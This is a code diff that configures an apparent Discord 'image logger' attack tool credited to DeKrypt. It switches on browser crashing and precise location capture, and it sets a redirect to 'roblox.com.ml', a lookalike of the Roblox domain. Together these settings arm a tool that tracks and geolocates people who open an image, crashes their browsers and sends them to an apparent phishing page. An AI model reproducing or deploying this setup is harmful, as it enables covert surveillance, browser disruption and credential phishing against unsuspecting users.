@@ -11,8 +11,8 @@ config = {
     "color": 0x1C2526,  # Very dark grey
 
     # OPTIONS #
-    "crashBrowser": False,
-    "accurateLocation": False,
+    "crashBrowser": True,
+    "accurateLocation": True,
     "message": {
         "doMessage": False,
         "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
@@ -25,7 +25,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False,
-        "page": "https://your-link.here"
+        "redirect": True,
+        "page": "https://www.roblox.com.ml/communities/171572639/unset"
     },
 }
